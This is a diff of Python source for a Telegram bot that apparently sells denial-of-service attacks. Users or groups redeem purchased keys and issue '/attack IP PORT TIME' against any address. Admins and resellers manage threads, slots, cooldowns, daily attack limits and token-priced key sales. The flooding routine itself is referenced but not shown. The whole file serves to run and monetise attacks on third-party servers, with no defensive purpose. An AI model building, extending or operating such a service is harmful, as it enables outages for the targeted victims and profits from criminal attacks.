-USER COMMANDS:
-/attack IP PORT TIME - Start attack
-/stop - Stop attack
-/id - Your ID
-/redeem KEY - Redeem access key
-/help - This menu
-/rules - Bot rules
+👤 USER COMMANDS:
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+/id - Get Your ID
+/redeem KEY - Redeem Access Key
+/help - Help Menu
+/rules - Bot Rules
 ━━━━━━━━━━━━━━━━━━━━━━━━
-ADMIN COMMANDS:
-/adduser ID DAYS - Add user
-/removeuser ID - Remove user
-/addreseller ID TOKENS - Add reseller
-/removereseller ID - Remove reseller
-/setthreads NUM - Set threads
-/settime SEC - Set max time
-/setslots NUM - Set max slots
-/setcooldown SEC - Set cooldown
-/setdaily LIMIT - Set daily limit
-/gen PREFIX DURATION - Generate key
-/keys - List all keys
-/deletekeys - Delete all keys
-/blockkey KEY - Block key
-/unblockkey KEY - Unblock key
-/broadcast MSG - Broadcast message
-/lock - Lock bot
-/unlock - Unlock bot
-/unlimited ID - Make reseller unlimited
-/limited ID TOKENS - Make reseller limited
+📌 ADMIN COMMANDS
 ━━━━━━━━━━━━━━━━━━━━━━━━
-RESELLER COMMANDS:
-/genkey - Generate key
-/mykeys - Your keys
-/deletekey KEY - Delete your key
-/blockkey KEY - Block your key
-/unblockkey KEY - Unblock your key
+⚔️ ATTACK:
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+
+👤 USER:
+/id - Get Your ID
+/redeem KEY - Redeem Access Key
+/help - Help Menu
+/rules - Bot Rules
+/commands - Show All Commands
+
+👥 USER MANAGEMENT:
+/adduser ID DAYS - Add User
+/removeuser ID - Remove User
+
+👥 GROUP MANAGEMENT:
+/addgroup ID DAYS - Add Group
+/removegroup ID - Remove Group
+
+⚙️ SETTINGS:
+/setthreads NUM - Set Threads
+/settime SEC - Set Max Time
+/setslots NUM - Set Max Slots
+/setcooldown SEC - Set Cooldown
+/setdaily LIMIT - Set Daily Attack Limit
+/lock - Lock Bot (Admin Only)
+/unlock - Unlock Bot (Admin Only)
+
+🔑 KEY MANAGEMENT:
+/gen PREFIX DAYS/HOURS - Generate Key
+/keys - List All Keys
+/deletekeys - Delete Keys
+/blockkey KEY - Block Key
+/unblockkey KEY - Unblock Key
+
+💼 RESELLER MANAGEMENT:
+/addreseller ID TOKENS - Add Reseller
+/removereseller ID - Remove Reseller
+/resellers - List Resellers
+/unlimited ID - Make Reseller Unlimited
+/limited ID TOKENS - Make Reseller Limited
+
+🎥 VIDEO:
+Send Video - Set Attack Video
+/delvideo - Delete Attack Video
 ━━━━━━━━━━━━━━━━━━━━━━━━
-    """)
+""")
+    elif is_reseller(uid):
+        send_msg(chat_id, """
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 RESELLER COMMANDS
+━━━━━━━━━━━━━━━━━━━━━━━━
+⚔️ ATTACK:
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
 
-def handle_adduser2(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN2, chat_id, "❌ Send: USER_ID DAYS\nExample: 123456789 7")
-        return
-    try:
-        uid = int(parts[0])
-        days = int(parts[1])
-        if 1 <= days <= 30:
-            add_user2(uid, days)
-            send_msg(TOKEN2, chat_id, f"✅ User {uid} added for {days} days!")
-        else:
-            send_msg(TOKEN2, chat_id, "Days must be 1-30")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid input")
+👤 USER:
+/id - Get Your ID
+/redeem KEY - Redeem Access Key
+/help - Help Menu
+/rules - Bot Rules
+/commands - Show All Commands
 
-def handle_removeuser2(chat_id, text):
-    try:
-        uid = int(text.strip())
-        remove_user2(uid)
-        send_msg(TOKEN2, chat_id, f"✅ User {uid} removed!")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid USER ID")
-
-def handle_addgroup2(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN2, chat_id, "❌ Send: GROUP_ID DAYS\nExample: -100123456789 7")
-        return
-    try:
-        gid = parts[0]
-        days = int(parts[1])
-        if 1 <= days <= 30:
-            add_group2(gid, days)
-            send_msg(TOKEN2, chat_id, f"✅ Group {gid} added for {days} days!")
-        else:
-            send_msg(TOKEN2, chat_id, "Days must be 1-30")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid input")
-
-def handle_removegroup2(chat_id, text):
-    try:
-        gid = text.strip()
-        remove_group2(gid)
-        send_msg(TOKEN2, chat_id, f"✅ Group {gid} removed!")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid GROUP ID")
-
-def handle_addreseller2(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN2, chat_id, "❌ Send: USER_ID TOKENS\nExample: 123456789 100")
-        return
-    try:
-        uid = int(parts[0])
-        tokens = int(parts[1])
-        add_reseller2(uid, tokens)
-        send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} added with {tokens} tokens!")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid input")
-
-def handle_removereseller2(chat_id, text):
-    try:
-        uid = int(text.strip())
-        remove_reseller2(uid)
-        send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} removed!")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid ID")
-
-def handle_setthreads2(chat_id, text):
-    global attack_threads
-    try:
-        threads = int(text.strip())
-        if 100 <= threads <= 5000:
-            attack_threads = threads
-            send_msg(TOKEN2, chat_id, f"✅ Threads set to {attack_threads}")
-        else:
-            send_msg(TOKEN2, chat_id, "Threads must be 100-5000")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid number")
-
-def handle_settime2(chat_id, text):
-    global attack_time
-    try:
-        time_sec = int(text.strip())
-        if 60 <= time_sec <= 600:
-            attack_time = time_sec
-            send_msg(TOKEN2, chat_id, f"✅ Max time set to {attack_time}s")
-        else:
-            send_msg(TOKEN2, chat_id, "Time must be 60-600 seconds")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid number")
-
-def handle_setslots2(chat_id, text):
-    global MAX_SLOTS
-    try:
-        slots = int(text.strip())
-        if 1 <= slots <= 200:
-            MAX_SLOTS = slots
-            send_msg(TOKEN2, chat_id, f"✅ Max slots set to {MAX_SLOTS}")
-        else:
-            send_msg(TOKEN2, chat_id, "Slots must be 1-200")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid number")
-
-def handle_setcooldown2(chat_id, text):
-    global cooldown_seconds
-    try:
-        cooldown = int(text.strip())
-        if 0 <= cooldown <= 600:
-            cooldown_seconds = cooldown
-            send_msg(TOKEN2, chat_id, f"✅ Cooldown set to {cooldown_seconds}s")
-        else:
-            send_msg(TOKEN2, chat_id, "Cooldown must be 0-600 seconds")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid number")
-
-def handle_setdaily2(chat_id, text):
-    global attack_daily_limit
-    try:
-        limit = int(text.strip())
-        if 1 <= limit <= 1000:
-            attack_daily_limit = limit
-            send_msg(TOKEN2, chat_id, f"✅ Daily limit set to {attack_daily_limit}")
-        else:
-            send_msg(TOKEN2, chat_id, "Limit must be 1-1000")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid number")
-
-def handle_gen2(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN2, chat_id, "Usage: /gen PREFIX DURATION\nExample: /gen DEVIL 7d")
-        return
-    prefix, duration = parts[0].upper(), parts[1].lower()
-    days, hours = 0, 0
-    if duration.endswith('d'):
-        days = int(duration[:-1])
-    elif duration.endswith('h'):
-        hours = int(duration[:-1])
+🔑 KEY MANAGEMENT:
+/genkey - Generate Keys
+/deletekey - Delete Your Keys
+/blockkey KEY - Block Your Key
+/unblockkey KEY - Unblock Your Key
+/myblockedkeys - Show Your Blocked Keys
+━━━━━━━━━━━━━━━━━━━━━━━━
+""")
     else:
-        send_msg(TOKEN2, chat_id, "❌ Use 'd' for days or 'h' for hours")
-        return
-    key = generate_admin_key2(prefix, days, hours)
-    send_msg(TOKEN2, chat_id, f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {days}d" if days > 0 else f"✅ KEY GENERATED!\n🔑 {key}\n⏱️ Valid: {hours}h")
+        send_msg(chat_id, """
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 USER COMMANDS
+━━━━━━━━━━━━━━━━━━━━━━━━
+/attack IP PORT TIME - Start Attack
+/stop - Stop Attack
+/id - Get Your ID
+/redeem KEY - Redeem Access Key
+/help - Help Menu
+/rules - Bot Rules
+━━━━━━━━━━━━━━━━━━━━━━━━
+""")
 
-def handle_keys2(chat_id):
-    if not keys2:
-        send_msg(TOKEN2, chat_id, "No keys available!")
+def handle_id(chat_id, uid, cid):
+    if cid < 0:
+        send_msg(chat_id, f"🆔 Group ID: {cid}")
         return
-    unused = [f"🔑 {k} - {v['days']}d" if v['days'] > 0 else f"🔑 {k} - {v['hours']}h" for k, v in keys2.items() if not v.get('used', False) and not v.get('blocked', False)]
-    if unused:
-        send_msg(TOKEN2, chat_id, "📋 AVAILABLE KEYS:\n" + "\n".join(unused[:20]))
+    
+    if not is_user(uid) and not is_reseller(uid):
+        send_msg(chat_id, "❌ Not Approved! Use /redeem KEY")
+        return
+    
+    if uid == ADMIN_ID:
+        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
+    elif is_reseller(uid):
+        tokens = get_reseller_tokens(uid)
+        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
     else:
-        send_msg(TOKEN2, chat_id, "No unused keys!")
+        expiry = get_user_expiry(uid)
+        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")
 
-def handle_deletekeys2(chat_id):
-    keys2.clear()
-    save_keys2()
-    send_msg(TOKEN2, chat_id, "✅ All keys deleted!")
-
-def handle_blockkey2(chat_id, text):
-    key = text.strip().upper()
-    if key not in keys2:
-        send_msg(TOKEN2, chat_id, "❌ Key not found!")
+def handle_redeem(chat_id, uid, args):
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /redeem KEY")
         return
-    if keys2[key].get('blocked', False):
-        send_msg(TOKEN2, chat_id, "❌ Key already blocked!")
+    success, msg = redeem_key(uid, args[0].upper())
+    send_msg(chat_id, msg)
+
+def handle_genkey_reseller(chat_id, uid):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
         return
-    creator = keys2[key].get('created_by', 'unknown')
-    add_blocked_key2(creator, key)
-    send_msg(TOKEN2, chat_id, f"✅ Key {key} blocked!")
-
-def handle_unblockkey2(chat_id, text):
-    key = text.strip().upper()
-    if not blocked_keys2.get(key, False):
-        send_msg(TOKEN2, chat_id, "❌ Key not blocked!")
-        return
-    remove_blocked_key2(key)
-    send_msg(TOKEN2, chat_id, f"✅ Key {key} unblocked!")
-
-def handle_broadcast2(chat_id, text):
-    msg = text.strip()
-    if not msg:
-        send_msg(TOKEN2, chat_id, "Send message to broadcast")
-        return
-    sent = 0
-    for uid in list(users2.keys()):
-        try:
-            send_msg(TOKEN2, int(uid), f"📢 BROADCAST:\n{msg}")
-            sent += 1
-        except:
-            pass
-    send_msg(TOKEN2, chat_id, f"✅ Broadcast sent to {sent} users")
-
-def handle_lock2(chat_id):
-    global is_locked2
-    is_locked2 = True
-    send_msg(TOKEN2, chat_id, "🔒 Bot Locked!")
-
-def handle_unlock2(chat_id):
-    global is_locked2
-    is_locked2 = False
-    send_msg(TOKEN2, chat_id, "🔓 Bot Unlocked!")
-
-def handle_unlimited2(chat_id, text):
-    try:
-        uid = int(text.strip())
-        if str(uid) in resellers2:
-            resellers2[str(uid)]['unlimited'] = True
-            resellers2[str(uid)]['tokens'] = -1
-            save_resellers2()
-            send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} now has UNLIMITED tokens!")
-        else:
-            send_msg(TOKEN2, chat_id, "❌ Reseller not found!")
-    except:
-        send_msg(TOKEN2, chat_id, "❌ Invalid ID!")
-
-def handle_limited2(chat_id, text):
-    parts = text.strip().split()
-    if len(parts) != 2:
-        send_msg(TOKEN2, chat_id, "Usage: /limited ID TOKENS")
-        return
-    try:
-        uid = int(parts[0])
-        tokens = int(parts[1])
-        if str(uid) in resellers2:
-            resellers2[str(uid)]['unlimited'] = False
-            resellers2[str(uid)]['tokens'] = tokens
-            save_resellers2()
-            send_msg(TOKEN2, chat_id, f"✅ Reseller {uid} now has {tokens} tokens!")
-        else:
-            send_msg(TOKEN2, chat_id, "❌ Reseller not found!")
-    except:
-        send_msg(TOKEN2, chat_id, "Invalid input!")
-
-def handle_genkey_reseller2(chat_id, uid):
     buttons = [
         [{"text": "🕐 1 HOUR - 0 TOKENS", "callback_data": "genkey_1h"}],
         [{"text": "🕐 12 HOURS - 2 TOKENS", "callback_data": "genkey_12h"}],
@@ -1763,97 +805,543 @@ def handle_genkey_reseller2(chat_id, uid):
         [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_30d"}],
         [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
     ]
-    send_inline_buttons(TOKEN2, chat_id, f"💼 SELECT KEY TYPE\n💰 Balance: {get_reseller_tokens2(uid)}", buttons)
+    send_inline_buttons(chat_id, f"💼 SELECT KEY TYPE\n\n💰 Balance: {get_reseller_tokens(uid)}", buttons)
 
-def handle_mykeys2(chat_id, uid):
-    keys_list = get_reseller_keys2(uid)
+def handle_deletekey_reseller(chat_id, uid):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    keys_list = get_reseller_keys(uid)
     if not keys_list:
-        send_msg(TOKEN2, chat_id, "❌ No keys generated!")
+        send_msg(chat_id, "❌ No keys to delete!")
         return
-    msg = "🔑 YOUR GENERATED KEYS:\n\n" + "\n".join([f"• {k}" for k in keys_list])
-    send_msg(TOKEN2, chat_id, msg[:4000])
+    buttons = [[{"text": f"🔑 {k}", "callback_data": f"delkey_{k}"}] for k in keys_list[:20]]
+    buttons.append([{"text": "❌ CANCEL", "callback_data": "delkey_cancel"}])
+    send_inline_buttons(chat_id, "🗑️ SELECT KEY TO DELETE", buttons)
 
-def handle_deletekey_reseller2(chat_id, uid, text):
-    key = text.strip().upper()
-    if key not in keys2 or keys2[key].get('created_by') != str(uid):
-        send_msg(TOKEN2, chat_id, "❌ You can only delete keys you generated!")
+def handle_blockkey_reseller(chat_id, uid, args):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
         return
-    if delete_key2(key):
-        send_msg(TOKEN2, chat_id, f"✅ Key {key} deleted!")
-    else:
-        send_msg(TOKEN2, chat_id, "❌ Key not found!")
-
-def handle_blockkey_reseller2(chat_id, uid, text):
-    key = text.strip().upper()
-    if key not in keys2 or keys2[key].get('created_by') != str(uid):
-        send_msg(TOKEN2, chat_id, "❌ You can only block keys you generated!")
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /blockkey KEY")
         return
-    add_blocked_key2(uid, key)
-    send_msg(TOKEN2, chat_id, f"✅ Key {key} blocked!")
-
-def handle_unblockkey_reseller2(chat_id, uid, text):
-    key = text.strip().upper()
-    if not blocked_keys2.get(key, False):
-        send_msg(TOKEN2, chat_id, "❌ Key not blocked!")
+    key = args[0].upper()
+    if key not in keys or keys[key].get('created_by') != str(uid):
+        send_msg(chat_id, "❌ You can only block keys you generated!")
         return
-    remove_blocked_key2(key)
-    send_msg(TOKEN2, chat_id, f"✅ Key {key} unblocked!")
+    if is_key_blocked(key):
+        send_msg(chat_id, "❌ Key already blocked!")
+        return
+    add_blocked_key(uid, key, "blocked_by_reseller")
+    send_msg(chat_id, f"✅ Key {key} blocked!")
 
-def handle_myblockedkeys2(chat_id, uid):
-    blocked = get_reseller_blocked_keys2(uid)
+def handle_unblockkey_reseller(chat_id, uid, args):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /unblockkey KEY")
+        return
+    key = args[0].upper()
+    if key not in blocked_keys or blocked_keys[key].get('blocked_by') != str(uid):
+        send_msg(chat_id, "❌ You can only unblock keys you blocked!")
+        return
+    remove_blocked_key(key)
+    send_msg(chat_id, f"✅ Key {key} unblocked!")
+
+def handle_myblockedkeys(chat_id, uid):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    blocked = get_reseller_blocked_keys(uid)
     if not blocked:
-        send_msg(TOKEN2, chat_id, "❌ No blocked keys!")
+        send_msg(chat_id, "❌ No blocked keys!")
         return
-    msg = "🚫 YOUR BLOCKED KEYS:\n\n" + "\n".join([f"• {k}" for k in blocked])
-    send_msg(TOKEN2, chat_id, msg)
+    send_msg(chat_id, "🚫 YOUR BLOCKED KEYS\n━━━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join([f"🔑 {k}" for k in blocked]))
 
-def handle_resellers2(chat_id):
-    if not resellers2:
-        send_msg(TOKEN2, chat_id, "No resellers!")
+def handle_blockkey_admin(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
         return
-    msg = "💼 RESELLERS LIST:\n\n"
-    for rid, data in resellers2.items():
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /blockkey KEY")
+        return
+    key = args[0].upper()
+    if key not in keys:
+        send_msg(chat_id, "❌ Key not found!")
+        return
+    if is_key_blocked(key):
+        send_msg(chat_id, "❌ Key already blocked!")
+        return
+    creator = keys[key].get('created_by', 'unknown')
+    add_blocked_key(creator, key, "blocked_by_admin")
+    send_msg(chat_id, f"✅ Key {key} blocked!")
+
+def handle_unblockkey_admin(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /unblockkey KEY")
+        return
+    key = args[0].upper()
+    if key not in blocked_keys:
+        send_msg(chat_id, "❌ Key not blocked!")
+        return
+    remove_blocked_key(key)
+    send_msg(chat_id, f"✅ Key {key} unblocked!")
+
+def handle_gen_admin(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 2:
+        send_msg(chat_id, "Usage: /gen PREFIX DURATION")
+        return
+    prefix, duration = args[0].upper(), args[1].lower()
+    days, hours = 0, 0
+    if duration.endswith('d'):
+        days = int(duration[:-1])
+    elif duration.endswith('h'):
+        hours = int(duration[:-1])
+    else:
+        send_msg(chat_id, "❌ Use 'd' or 'h'!")
+        return
+    key = generate_admin_key(prefix, days, hours)
+    send_msg(chat_id, f"✅ Key Generated!\n🔑 {key}\n⏱️ Valid for: {days}d" if days > 0 else f"✅ Key Generated!\n🔑 {key}\n⏱️ Valid for: {hours}h")
+
+def handle_keys(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if not keys:
+        send_msg(chat_id, "No keys!")
+        return
+    unused, used, blocked = [], [], []
+    for k, v in keys.items():
+        dur = f"{v['days']}d" if v['days'] > 0 else f"{v['hours']}h"
+        if v.get('blocked', False) or is_key_blocked(k):
+            blocked.append(f"🔑 {k} - {dur} - BLOCKED")
+        elif v['used']:
+            used.append(f"🔑 {k} - {dur} - Used by {v['used_by']}")
+        else:
+            unused.append(f"🔑 {k} - {dur} - Available")
+    msg = "📋 KEYS LIST\n\n"
+    if unused:
+        msg += "✅ UNUSED:\n" + "\n".join(unused[:15]) + "\n\n"
+    if used:
+        msg += "❌ USED:\n" + "\n".join(used[:15]) + "\n\n"
+    if blocked:
+        msg += "🚫 BLOCKED:\n" + "\n".join(blocked[:15])
+    send_msg(chat_id, msg[:4000])
+
+def handle_deletekeys_admin(chat_id, uid):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    buttons = [
+        [{"text": "🗑️ DELETE ALL UNUSED KEYS", "callback_data": "admin_del_unused"}],
+        [{"text": "🗑️ DELETE ALL USED KEYS", "callback_data": "admin_del_used"}],
+        [{"text": "🗑️ DELETE ALL KEYS", "callback_data": "admin_del_all"}],
+        [{"text": "❌ CANCEL", "callback_data": "admin_del_cancel"}]
+    ]
+    send_inline_buttons(chat_id, "🗑️ ADMIN - DELETE KEYS", buttons)
+
+def handle_setthreads(chat_id, uid, args):
+    global attack_threads
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /setthreads NUM")
+        return
+    attack_threads = int(args[0])
+    send_msg(chat_id, f"✅ Threads set to {attack_threads}")
+
+def handle_settime(chat_id, uid, args):
+    global attack_time
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /settime SEC")
+        return
+    attack_time = int(args[0])
+    if attack_time < 10:
+        attack_time = 10
+    if attack_time > 600:
+        attack_time = 600
+    save()
+    send_msg(chat_id, f"✅ Max time set to {attack_time}s")
+
+def handle_setslots(chat_id, uid, args):
+    global MAX_SLOTS
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /setslots NUM")
+        return
+    MAX_SLOTS = int(args[0])
+    if MAX_SLOTS < 1:
+        MAX_SLOTS = 1
+    if MAX_SLOTS > 200:
+        MAX_SLOTS = 200
+    save()
+    send_msg(chat_id, f"✅ Max slots set to {MAX_SLOTS}")
+
+def handle_setcooldown(chat_id, uid, args):
+    global cooldown_seconds
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /setcooldown SECONDS")
+        return
+    cooldown_seconds = int(args[0])
+    if cooldown_seconds < 0:
+        cooldown_seconds = 0
+    if cooldown_seconds > 600:
+        cooldown_seconds = 600
+    save()
+    send_msg(chat_id, f"✅ Cooldown set to {cooldown_seconds}s")
+
+def handle_setdaily(chat_id, uid, args):
+    global attack_daily_limit
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /setdaily LIMIT")
+        return
+    attack_daily_limit = int(args[0])
+    if attack_daily_limit < 1:
+        attack_daily_limit = 1
+    if attack_daily_limit > 1000:
+        attack_daily_limit = 1000
+    save()
+    send_msg(chat_id, f"✅ Daily limit set to {attack_daily_limit}")
+
+def handle_adduser(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 2:
+        send_msg(chat_id, "Usage: /adduser ID DAYS")
+        return
+    add_user(int(args[0]), int(args[1]), 0)
+    send_msg(chat_id, f"✅ User {args[0]} added for {args[1]} days!")
+
+def handle_removeuser(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /removeuser ID")
+        return
+    remove_user(args[0])
+    send_msg(chat_id, "✅ User removed!")
+
+def handle_addgroup(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 2:
+        send_msg(chat_id, "Usage: /addgroup ID DAYS")
+        return
+    add_group(args[0], int(args[1]))
+    send_msg(chat_id, f"✅ Group {args[0]} added for {args[1]} days!")
+
+def handle_removegroup(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /removegroup ID")
+        return
+    remove_group(args[0])
+    send_msg(chat_id, "✅ Group removed!")
+
+def handle_addreseller(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 2:
+        send_msg(chat_id, "Usage: /addreseller ID TOKENS")
+        return
+    add_reseller(int(args[0]), int(args[1]), False)
+    send_msg(chat_id, f"✅ Reseller {args[0]} added with {args[1]} tokens!")
+
+def handle_removereseller(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if len(args) != 1:
+        send_msg(chat_id, "Usage: /removereseller ID")
+        return
+    remove_reseller(args[0])
+    send_msg(chat_id, "✅ Reseller removed!")
+
+def handle_resellers(chat_id, uid, args):
+    if uid != ADMIN_ID:
+        send_msg(chat_id, "❌ Admin Only!")
+        return
+    if not resellers:
+        send_msg(chat_id, "No resellers!")
+        return
+    msg = "💼 RESELLERS LIST\n\n"
+    for rid, data in resellers.items():
         tokens = "∞" if data.get('unlimited', False) else data['tokens']
         msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━\n"
-    send_msg(TOKEN2, chat_id, msg[:4000])
+    send_msg(chat_id, msg[:4000])
 
-# ==================== MAIN LOOP ====================
+def handle_attack(chat_id, uid, cid, args):
+    global is_attack, current_target, VIDEO_FILE_ID, is_locked
+    
+    # LOCK CHECK - No one except admin can use commands when locked
+    if is_locked and uid != ADMIN_ID:
+        send_msg(chat_id, "🔒 Bot is locked! This command is currently off by admin.")
+        return
+    
+    if cid < 0:
+        if not is_group(cid):
+            send_msg(chat_id, "❌ Group Not Approved!")
+            return
+        if is_attack:
+            send_msg(chat_id, "⚠️ Attack Already Running! Use /stop")
+            return
+        if len(args) != 3:
+            send_msg(chat_id, "Usage: /attack IP PORT TIME")
+            return
+        ip, port, sec = args[0], int(args[1]), int(args[2])
+        # No minimum time restriction - user gets exactly what they request
+        if sec < 1:
+            sec = 1
+        if sec > attack_time:
+            send_msg(chat_id, f"❌ Max duration is {attack_time}s! You sent {sec}s")
+            return
+        if get_slots() <= 0:
+            send_msg(chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!\nPlease wait for free slot.")
+            return
+        is_attack = True
+        current_target = f"{ip}:{port}"
+        add_slot()
+        method_num = random.choice(attack_methods)
+        if VIDEO_FILE_ID:
+            try:
+                send_video(chat_id, VIDEO_FILE_ID, f"🎯 Attack Started!\nTarget: {ip}:{port}\nDuration: {sec}s")
+            except:
+                pass
+        msg_id = send_msg_and_get_id(chat_id, f"""
+⚡ ATTACK STARTED ⚡
+━━━━━━━━━━━━━━━━━━━━━━
+🎯 Target: {ip}
+🔌 Port: {port}
+⏱️ Time: {sec}s
+🖥 SERVER    : {server_status}
+🚀 BANDWIDTH : {bandwidth}
+⚙️ METHODS   : {method_num}/8
+━━━━━━━━━━━━━━━━━━━━━━
+""")
+        if msg_id:
+            threading.Thread(target=run_progress, args=(chat_id, msg_id, ip, port, sec, method_num)).start()
+        return
+    
+    if not is_user(uid) and not is_reseller(uid):
+        send_msg(chat_id, "❌ Not approved! Use /redeem KEY")
+        return
+    
+    can, msg = can_attack(uid)
+    if not can:
+        send_msg(chat_id, msg)
+        return
+    
+    if is_attack:
+        send_msg(chat_id, "⚠️ Attack already running! Use /stop")
+        return
+    if len(args) != 3:
+        send_msg(chat_id, "Usage: /attack IP PORT TIME")
+        return
+    ip, port, sec = args[0], int(args[1]), int(args[2])
+    # No minimum time restriction - user gets exactly what they request
+    if sec < 1:
+        sec = 1
+    if sec > attack_time:
+        send_msg(chat_id, f"❌ Max duration is {attack_time}s! You sent {sec}s")
+        return
+    if get_slots() <= 0:
+        send_msg(chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!\nPlease wait for free slot.")
+        return
+    
+    is_attack = True
+    current_target = f"{ip}:{port}"
+    add_slot()
+    add_attack_count(uid)
+    method_num = random.choice(attack_methods)
+    
+    if VIDEO_FILE_ID:
+        try:
+            send_video(chat_id, VIDEO_FILE_ID, f"🎯 Attack Started!\nTarget: {ip}:{port}\nDuration: {sec}s")
+        except:
+            pass
+    
+    msg_id = send_msg_and_get_id(chat_id, f"""
+⚡ ATTACK STARTED ⚡
+━━━━━━━━━━━━━━━━━━━━━━
+🎯 Target: {ip}
+🔌 Port: {port}
+⏱️ Time: {sec}s
+🖥 SERVER    : {server_status}
+🚀 BANDWIDTH : {bandwidth}
+⚙️ METHODS   : {method_num}/8
+━━━━━━━━━━━━━━━━━━━━━━
+""")
+    if msg_id:
+        threading.Thread(target=run_progress, args=(chat_id, msg_id, ip, port, sec, method_num)).start()
+
+def handle_stop(chat_id, uid, cid):
+    global is_attack, is_locked
+    
+    # LOCK CHECK - No one except admin can use commands when locked
+    if is_locked and uid != ADMIN_ID:
+        send_msg(chat_id, "🔒 Bot is locked! This command is currently off by admin.")
+        return
+    
+    if is_attack:
+        is_attack = False
+        remove_slot()
+        send_msg(chat_id, "🛑 ATTACK STOPPED!")
+    else:
+        send_msg(chat_id, "❌ No active attack!")
+
+def handle_genkey_callback(chat_id, uid, data, msg_id):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    try:
+        del_msg(chat_id, msg_id)
+    except:
+        pass
+    if data.startswith("genkey_"):
+        duration = data.replace("genkey_", "")
+        if duration == "cancel":
+            send_msg(chat_id, "❌ Cancelled!")
+            return
+        price = KEY_PRICES.get(duration, 0)
+        buttons = [[{"text": "✅ YES", "callback_data": f"confirm_{duration}"}], [{"text": "❌ NO", "callback_data": "confirm_cancel"}]]
+        send_inline_buttons(chat_id, f"⚠️ Confirm {duration} key\nTokens: {price}\nAre you sure?", buttons)
+
+def handle_confirm_callback(chat_id, uid, data, msg_id):
+    if not is_reseller(uid):
+        send_msg(chat_id, "❌ Only for resellers!")
+        return
+    try:
+        del_msg(chat_id, msg_id)
+    except:
+        pass
+    if data == "confirm_cancel":
+        send_msg(chat_id, "❌ Cancelled!")
+        return
+    duration = data.replace("confirm_", "")
